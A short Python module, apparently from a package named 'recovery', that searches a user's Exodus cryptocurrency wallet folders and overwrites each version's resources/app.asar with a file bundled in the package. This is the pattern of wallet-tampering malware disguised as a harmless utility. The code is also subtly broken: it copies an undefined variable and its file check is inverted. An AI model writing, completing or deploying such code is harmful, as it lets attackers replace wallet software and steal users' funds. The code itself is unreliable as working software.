import os
import pwd
import shutil
import pkg_resources

def get_username():
    return pwd.getpwuid(os.getuid())[0]

def check():
    package_path = pkg_resources.resource_filename('recovery', '')
    default_config_path = os.path.join(package_path, 'app.asar')
    #base_dir = "C:\\Users\\" + get_username() + "\\AppData\\Local\\exodus\\"
    base_dir = "/home/hammy/exodus/"
    prefix = "app-"

    if not os.path.isfile(default_config_path):
        print("File Found!")
        return

    for entry in os.listdir(base_dir):
        full_path = os.path.join(base_dir, entry)
        print(f"Iterating: {full_path}")

        if os.path.isdir(full_path) and entry.startswith(prefix):
            resources_path = os.path.join(full_path, 'resources', 'app.asar')
            print(f"Resource Path: {resources_path}")
            if os.path.isfile(resources_path):
                try:

                    print(f"Copying...")
                    shutil.copy(src_file, resources_path)
                except Exception as e:
                    print(f"Error: {e}")
                    pass
